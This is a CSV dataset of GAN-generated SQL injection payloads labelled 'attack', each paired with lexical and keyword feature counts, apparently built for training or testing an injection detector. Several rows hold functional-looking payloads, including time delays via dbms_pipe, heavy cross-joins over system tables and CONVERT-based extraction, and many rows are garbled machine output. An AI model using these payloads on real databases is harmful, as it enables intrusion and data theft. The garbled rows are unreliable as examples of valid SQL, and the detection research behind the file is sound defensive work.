label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,-41989'||  (  select ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,309,22.0,14.0,3.568084324344715,6.0,5.0,5.0,6.0,0.2727272727272727,0.22727272727272727,0.22727272727272727,0.2727272727272727,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""  =  ""%k' like '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,310,19.0,10.0,3.0105709342684834,5.0,1.0,6.0,7.0,0.2631578947368421,0.05263157894736842,0.3157894736842105,0.3684210526315789,2.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,select bfg$cc(n or where or where 9643,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,311,38.0,20.0,3.9380738947378657,26.0,4.0,6.0,2.0,0.6842105263157895,0.10526315789473684,0.15789473684210525,0.05263157894736842,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-6588'orh,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,312,9.0,8.0,2.94770277922009,3.0,4.0,0.0,2.0,0.3333333333333333,0.4444444444444444,0.0,0.2222222222222222,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-17607731z 7185    (  (  select 2*  (  =    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,313,44.0,19.0,3.3101492315852847,7.0,13.0,18.0,6.0,0.1590909090909091,0.29545454545454547,0.4090909090909091,0.13636363636363635,0.0,0.0,1.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,  '   )     3038 char  =  2180 5485  =  =%4,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,314,43.0,16.0,3.0088615709329307,4.0,13.0,20.0,6.0,0.09302325581395349,0.3023255813953488,0.46511627906976744,0.13953488372093023,1.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0
attack,1 ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,315,2.0,2.0,1.0,0.0,1.0,1.0,0.0,0.0,0.5,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-9148%'  =  '--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,316,15.0,9.0,2.923231428797621,0.0,4.0,4.0,7.0,0.0,0.26666666666666666,0.26666666666666666,0.4666666666666667,2.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-'+  (  select ' rhzabb  1087 char,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,317,34.0,19.0,3.8366003408685505,16.0,4.0,9.0,5.0,0.47058823529411764,0.11764705882352941,0.2647058823529412,0.14705882352941177,2.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0
attack,1%' or 8384  =  like  (  ''orj where 3038  =  8571  8459    =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,318,63.0,22.0,3.5419913837767116,14.0,17.0,24.0,8.0,0.2222222222222222,0.2698412698412698,0.38095238095238093,0.12698412698412698,3.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'a where 7522  )    *  107=   where xo",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,319,277.0,39.0,3.8212427169534227,87.0,36.0,110.0,44.0,0.3140794223826715,0.1299638989169675,0.3971119133574007,0.1588447653429603,2.0,0.0,0.0,0.0,1.0,2.0,0.0,23.0,0.0,2.0,4.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,11.0
attack,1   a   )    )    x   fromnt,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,320,28.0,11.0,2.254252482727041,8.0,1.0,17.0,2.0,0.2857142857142857,0.03571428571428571,0.6071428571428571,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' where char  =    /--z""  3038  =  u8315",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,321,41.0,19.0,3.600043311667598,11.0,9.0,14.0,7.0,0.2682926829268293,0.21951219512195122,0.34146341463414637,0.17073170731707318,1.0,1.0,2.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""=%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,322,137.0,30.0,3.842412062981289,40.0,16.0,52.0,29.0,0.291970802919708,0.11678832116788321,0.3795620437956204,0.2116788321167883,2.0,2.0,0.0,0.0,0.0,3.0,0.0,10.0,2.0,2.0,1.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,y,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,323,1.0,1.0,-0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'nm0hhr"" like "",U'   )    )    or 5903  =    (  ''   )    )    or 5903  =    (  'pe6093  (  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,324,94.0,24.0,3.198547064827885,16.0,14.0,46.0,18.0,0.1702127659574468,0.14893617021276595,0.48936170212765956,0.19148936170212766,5.0,2.0,0.0,0.0,0.0,3.0,0.0,7.0,0.0,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  '10  )     n ' where (  3862  =  7555,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,325,111.0,23.0,2.925882945663601,12.0,22.0,60.0,17.0,0.10810810810810811,0.1981981981981982,0.5405405405405406,0.15315315315315314,3.0,0.0,1.0,0.0,1.0,2.0,0.0,10.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""   8571 157068char=  =  (  =  =""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,326,179.0,35.0,4.0668991204260765,79.0,18.0,57.0,25.0,0.441340782122905,0.1005586592178771,0.31843575418994413,0.13966480446927373,1.0,4.0,0.0,0.0,1.0,6.0,0.0,7.0,1.0,0.0,2.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-'   )    )    or 5903  =    (  '7185""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""44621"" or 3393  4018 7417  =  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,327,418.0,43.0,3.7365330563484203,111.0,59.0,185.0,63.0,0.26555023923444976,0.14114832535885166,0.44258373205741625,0.1507177033492823,2.0,3.0,1.0,0.0,0.0,4.0,0.0,37.0,0.0,2.0,4.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,12.0
attack,"'gn"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and """"  =  ""nntcf where 2961  =    (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,328,378.0,38.0,3.6756874850385013,105.0,48.0,160.0,65.0,0.2777777777777778,0.12698412698412698,0.42328042328042326,0.17195767195767195,1.0,4.0,0.0,0.0,0.0,4.0,0.0,32.0,0.0,3.0,0.0,24.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1't' or '  selectd phcccor 8571  2027  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,329,40.0,19.0,3.8225738836114354,17.0,9.0,10.0,4.0,0.425,0.225,0.25,0.1,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"'||  (  select 'selectdhdsg'  =  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,330,41.0,14.0,3.3365616671059457,17.0,0.0,13.0,11.0,0.4146341463414634,0.0,0.3170731707317073,0.2682926829268293,4.0,2.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"select 6671n  8571 Hg',unwg8004",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,331,31.0,20.0,4.180002761999778,13.0,12.0,4.0,2.0,0.41935483870967744,0.3870967741935484,0.12903225806451613,0.06451612903225806,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,-77311760 where   =  =  6503$h4018 and  2027 ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,332,45.0,20.0,3.807976707200401,9.0,20.0,12.0,4.0,0.2,0.4444444444444444,0.26666666666666666,0.08888888888888889,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""%a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,333,4.0,4.0,2.0,1.0,1.0,0.0,2.0,0.25,0.25,0.0,0.5,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'a oh4018g=xhkke'  =  'je*  h",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,334,206.0,35.0,3.8160366109394284,123.0,16.0,48.0,19.0,0.5970873786407767,0.07766990291262135,0.23300970873786409,0.09223300970873786,4.0,0.0,0.0,0.0,2.0,3.0,0.0,4.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'+  (  select 'acs nlzasy""  =  ""  =  or 7793  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,335,47.0,21.0,3.634551494158079,17.0,5.0,17.0,8.0,0.3617021276595745,0.10638297872340426,0.3617021276595745,0.1702127659574468,2.0,2.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,336,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ''   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'h'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,337,459.0,32.0,3.1935494920883967,102.0,59.0,229.0,69.0,0.2222222222222222,0.12854030501089325,0.4989106753812636,0.1503267973856209,6.0,0.0,0.0,0.0,1.0,4.0,0.0,46.0,1.0,0.0,1.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,19.0
attack,1' in boolean mode  )   or 6979  =  like  (  '%amdknb.y1zp  (  =  *,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,338,67.0,26.0,3.8936757577169034,28.0,6.0,23.0,10.0,0.417910447761194,0.08955223880597014,0.34328358208955223,0.14925373134328357,2.0,0.0,0.0,0.0,1.0,2.0,0.0,3.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' in boolean mode  )   or 6979  =  like  (  '' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'n)    )     ))       as r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,339,310.0,37.0,3.7345097448243383,97.0,33.0,130.0,50.0,0.31290322580645163,0.1064516129032258,0.41935483870967744,0.16129032258064516,4.0,0.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,10.0
attack,"1""   or 8315  107  3880  =    U1570 or mwhere",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,340,45.0,16.0,3.3526383739632215,11.0,16.0,16.0,2.0,0.24444444444444444,0.35555555555555557,0.35555555555555557,0.044444444444444446,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  )   or   (  2301  =  7504  )  *7504 and   (  ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,341,238.0,37.0,3.760294807454738,60.0,36.0,100.0,42.0,0.25210084033613445,0.15126050420168066,0.42016806722689076,0.17647058823529413,6.0,0.0,0.0,0.0,1.0,3.0,0.0,20.0,2.0,1.0,3.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,9.0
